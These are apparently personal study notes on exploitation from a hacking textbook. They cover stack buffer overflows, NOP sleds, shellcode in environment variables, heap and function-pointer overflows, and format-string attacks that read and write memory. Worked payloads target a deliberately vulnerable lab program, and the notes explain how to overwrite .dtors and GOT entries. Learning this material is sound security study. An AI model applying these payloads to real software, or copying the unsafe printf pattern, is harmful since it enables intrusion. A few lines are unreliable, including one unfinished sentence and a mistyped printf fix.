## x300 Exploitation
### Buffer Overflow
#### Key concepts/definitions to know
- **Buffer Overflow** - When data written into a buffer (an allocation of memory) overides the boundaries of said buffer and spills into adjacent memory locations.
  - When data is overwritten it flows to higher addresses (remember, the stack grows to lower addresses)
- In a function, since data is placed on the stack in reverse order, variables defined before other variables are susceptible to being overwritten.
  - <details><summary>ex:</summary>
    ```c
    void main(){
      int var1;
      char var2[20];
    }
    ```
    *Note: In this scenario, if more than 20 bytes are written into the var2 character buffer, the remainder could overflow into var 1*
    </details>

- Because of this same concept, the lack of input validation can also lead to execution flow control if a hacker can overflow user-defined data into the return address
  - ![pic](https://www.mkdynamics.net/current_projects/computer_security/images/Basic_Linux_exploits/buffer_overflow_image.jpeg) 
  - When overflowing a buffer, there are two ways you can find the offset from the variable you control to the return address. You can 
    - Use an ever growing input repeating your return address until youre sucessful (Easier with command line argument stuff).
    - Use ```msf-pattern_create``` to make a unique byte array to overflow your return address and then ```msf-pattern_offset``` to find the specific size (Easier if your debugging info is more robust)
      - <details>
  
        ```bash
        msf-pattern_create -l 800 #will create a 800m byte buffer
        msf-pattern_offset -l 800 -q [RETURN_POINTER_VALUE] #will take the value from your return pointer ant tell you the offset from your variable
        ```
        </details>
- The ```strcpy()``` function alone does not institute input validation, and without it can make programs susceptible to overflow attacks
### NOP Sleds
- One of the most famous types of a buffer overflow exploit is the NOP (No Operation) Sled. In this technique, the hacker tries to land the return address to a range of memory addresses that feed sequentially into desired shellcode. Check out [this](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/) link for a full rundown.
- There Are three major parts to this exploit all equally as important.
![exploit](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254213.png.jpg)
  - **NOP Sled** - A single byte assembly instruction that does absolutley nothing and pushes you to the next instruction.
  ![Sled](https://www.coengoedegebure.com/content/images/2018/08/nopsled_slide.png)
  - **Shell Code** - These can come in all different flavors, but by in large they are some form of command line invocation (usually just executes /bin/sh)
  - **Return Address** - The return address redirects the executino flow to land somewhere within the NOP sled.  
- While predicting a location in memory to point to in order to hop on the sled can be a bit difficult with a dynamically changing stack, one trick is to use a predictable memory location such as th address of a function call argument (since these will always be before the rest of the stack frame, just make sure your sled isnt big enough to override these too) and subtract an offset in order to find a spot within the sled, this may take trial and error but you can automate it with a bit of scripting. ex:
  - ``` 
    ret = (unsigned int) &i - offset; // Set return address.
    ```
### Environmental Variables
- In some situations you may be dealing with a buffer that is too small for you to include a large NOP sled and  in the offset between your variable and the return pointer. In this case we have to be a bit more cognizant about the space we occupy. Thankfully shellcode can be placed in more locations than just the stack frame of this particular function.
- It is important to note that user environment variables are stored on the stack as well and when a program is run under the context of a specific user (even if it has suid root privileges) the stack will contain that specific users environment variables, this location is static but can shift a bit given certain factors such as the program's name
  -  To combat this, you can either use a NOP sled, or predict where this location will be. Thankfully this is easier with the ```getenv()``` function (with a few tweaks) 
     -  <details> <summary>getenvaddr.c</summary>
        
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char *ptr;

          if(argc < 3) {
              printf("Usage: %s <environment var> <target program name>\n", argv[0]);
              exit(0);
          }
          ptr = getenv(argv[1]); /* Get env var location. */
          ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
          printf("%s will be at %p\n", argv[1], ptr);
        }
        ```
        *Note: There is a two byte difference in environmental variable location per one byte of program name increase*
      </details>

### Heap Overflows
- The main thing of note in heap based overflow attacks is that these are going to be largely focused on overriding certain variables to control program functionality rather than execution flow.
  - This simply means that the end goal of the exploits are going to be largely dependant on the functionality of thr program. 
-  In the context of this book, while the heap may be dynamically allocated, variables that reside int he heap are sequential in nature and can be overwritten into one another.  
-  Since the heap grows Higher into increased memory addresses, variables overflow in the order in which they are initialized in the program. 
### Function Pointer Overflow
- Function pointers, like any other variable can be overflowed, when a function pointer is referenced in a variable initialization in something like a struct, or even another function, the rules of regular buffer overflow still apply, if you can find the offset of the two variables and use input to overflow and override  a function pointer, you can control execution flow when it comes time for that function pointer to be referenced.
- ```nm``` can be used to list the addresses of various functions in a program in case you want to call a seperate function versus using shellcode. 
### Format Strings
We reference format strings [earlier](https://github.com/adminprivileges/skillbridgreNotes#things-to-remember) in the notes, but what we fail to mention is the fact that ther are stored alongside the variable in the stack when a ```printf()``` function is called. To learn more about this, check out [this link](https://axcheron.github.io/exploit-101-format-strings/) . 
- Since format strings are stored on the stack, if proper input control validation isn't exercised, then the address of the format string can be overflowed leading to arbirtary memory read and write capabilities.
- Similar to ```scanf()```, ```printf``` has the ability to be abused to allow for overflow without proper input validation. 
  - The biggest countermeasure for this is to only accept input in the form of a format string to ensure that ```printf()``` interprets the totality of the argument it is sent as one contiguous string. This is done by using ```printf(%, [VARIABLE])``` instead of ```printf([VARIABLE])``` .
    - <details><summary>fmt_vuln.c</summary>

        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char text[1024];
          static int test_val = -72;

          if(argc < 2) {
              printf("Usage: %s <text to print>\n", argv[0]);
              exit(0);
          }
          strcpy(text, argv[1]);

          printf("The right way to print user-controlled input:\n");
          printf("%s", text);


          printf("\nThe wrong way to print user-controlled input:\n");
          printf(text);

          printf("\n");

          // Debug output
          printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, 
        test_val);

          exit(0);
        }
        ```
    </details>

    - <details> <summary>example output</summary>

        ```
        reader@hacking:~/booksrc $ ./fmt_vuln testing %x
        The right way to print user-controlled input:
        testing%x
        The wrong way to print user-controlled input:
        testingbffff3e0
        ```
        *Note: In the same way that ```testing %x``` can be used to examine the next memory address, this can be repeated indefinitely to read stack memory*
    </details>
#### Writing to a buffer
- Just like data can be read from memory using format strings, it can be written using them as well. The ```%n``` format string is used to write the ammount of bytes written so far. If we can influence the data written so far, we can effectively write to a memory address that we control, the intended variable.
  - In order to find the offset from the the format string buffer to tthe intended variable you can place a predictable string (like AAAA) and pair it with a multitude of repeated format strings (```%x```) until  
- Data can be written to our intended variable in one of two ways
  - Manipulating the field width of your format strings for 4 consecutive writes, using regular format strings that reference sequential bits of memory with 4 byte offsets. Unfortunately you can only influence one byte at a time with this method resulting in you having to run the program 4 times back to back slowly incrementing the memory address. All in all, the operation will look something like this (for 4 times):
    - <details>
    
      ```
      reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
      The right way to print user-controlled input:
      ??JUNK??JUNK??JUNK??%x%x%126x%n
      The wrong way to print user-controlled input:
      ??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
      0
      [*] test_val @ 0x08049794 = 170 0x000000aa 
      ```
    </details>
  - Using Direct parameter access to simplify the above method for simpler, single execution writes (which i do understand so im going to explain).
    -  <details><summary>Reading</summary>

          Its a bit easier to explain writing if i explain reading first. In the same  way that ```./fmt_vuln AAAA%x%x%x%x``` can read ```AAAA...41414141```, ```./fmt_vuln AAAA%4\$x``` can be used to read ```AAAA41414141``` it does so by asking for the Nth occurence of a sequence with the special character ```$``` (which needs to be escaped since we are using this in the context of bash as an argument. ```%4/$x == %4$x```  which translates to the 4th occuence of the 4 byte hexadecimal sequence. 
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
          The right way to print user-controlled input:
          AAAA%x%x%x%x
          The wrong way to print user-controlled input:
          AAAAbffff3d0b7fe75fc041414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
          The right way to print user-controlled input:
          AAAA%4$x
          The wrong way to print user-controlled input:
          AAAA41414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8 
          reader@hacking:~/booksrc $
          ```

       </details>
    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a little bit of math to rewrite the address.
      - <details><summary>Ex</summary>

          Using the example from the book. The intent is to change the address of tets_val to ```0xbffffd72```. First we hav to clear our the current value. 
          ```c
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
          The right way to print user-controlled input:
          ????????%4$n
          The wrong way to print user-controlled input:
          ????????
          [*] test_val @ 0x08049794 = 16 0x00000010

          ```
          This changes overrides the memory location and changes the value to 16 bytes which is the value of the 4 words. Next we can do some math to calculate the number of bits that need to be written for each byte of the memory address. This is done by starting with the 16 bytes and then calculating the offsets for each following byte via subtraction
          ```
          reader@hacking:~/booksrc $ gdb -q
          (gdb) p 0x72 - 16
          $1 = 98
          (gdb) p 0xfd - 0x72
          $2 = 139
          (gdb) p 0xff - 0xfd
          $3 = 2
          (gdb) p 0x1ff - 0xfd
          $4 = 258
          (gdb) p 0xbf - 0xff
          $5 = -64
          (gdb) p 0x1bf - 0xff
          $6 = 192
          (gdb) quit
          ```
          With these offsets in mind, starting with ```%98x%4\$n``` we should be able to build a string that will override the entire memory address in one call.that will look something like
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" ."\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
          The right way to print user-controlled input:
          ????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
          The wrong way to print user-controlled input:
          ???????? 
                                                                          bffff3b0
                                                          b7fe75fc
                                      0
                                            8049794
          [*] test_val @ 0x08049794 = -1073742478 0xbffffd72
          ```
        </details>   

### Destructors (.dtors)
In C objects (to include functions like main) are paired with constructors and destructors which allocate and release resources when objects come in and out of scope. If these are not user defined, the compiler will simply choose the defaults. Functions can be defined as destructors by specifying the attribute in the function prototype ex: 
```c
static void cleanup(void) __attribute__ ((destructor));
```
Using the ```nm``` command, we can inspect the destructors, the addresses to these functions are stored sequentially in the stack, beginning at ```__DTOR_LIST__``` and ```__DTOR_END__``` these addresses should hold the values of```0x00000000``` and ```0xffffffff``` respectively. If no user defined destructors exist, these memory addresses will only be 4 bytes apart, otherwise a pointer to a user defined destructor will reside here. *Note: you can also use ```objdump``` to just print the destructor table.
```
reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln:     file format elf32-i386

Contents of section .dtors:
 8049690 ffffffff 00000000 
```
It is important to note that the destructors table is writable (if you want to fact check me, run a ```objdump -h``` on a file and notice the lack of a READONLY attribute) given this fact if we have a program that runs under root privileges we can combine this with other techniques such as format string/buffer overflow exploits to control execution flow.
### Global Offset table
The global offset table along eith the procedure linkage table are used to convert position independent addresses to absolute locations (or in engligh it stores dynamic memory locations in static predictable pointers). This is important to understand because this is how programs reference essential functions such as ```exit()```. More importantly, the GOT is writable, which means again, we can influence program execution flow if we override these pointers. To inspect the address of these pointers you can inspect dynamic resolution entries of the GOT using ```objdump``` ex:
```
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049764 R_386_GLOB_DAT    __gmon_start__
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   strcpy
08049780 R_386_JUMP_SLOT   printf
08049784 R_386_JUMP_SLOT   exit
```
